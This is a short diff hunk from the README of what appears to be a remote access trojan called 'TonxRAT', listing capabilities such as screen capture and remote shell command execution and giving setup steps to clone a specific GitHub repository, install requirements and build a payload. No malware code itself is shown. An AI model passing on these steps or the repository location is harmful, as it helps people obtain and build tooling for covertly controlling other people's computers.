@@ -36,7 +36,7 @@ sysinfo - System information screenshot - Capture screen shell - Execute command
 
 ### 1. Setup
 ```bash
-git clone https://github.com/yourusername/TonxRAT.git
+git clone https://github.com/Anton-ai111/TonxRAT-v2.git
 cd TonxRAT
 pip install -r requirements.txt
 2. Build Payload
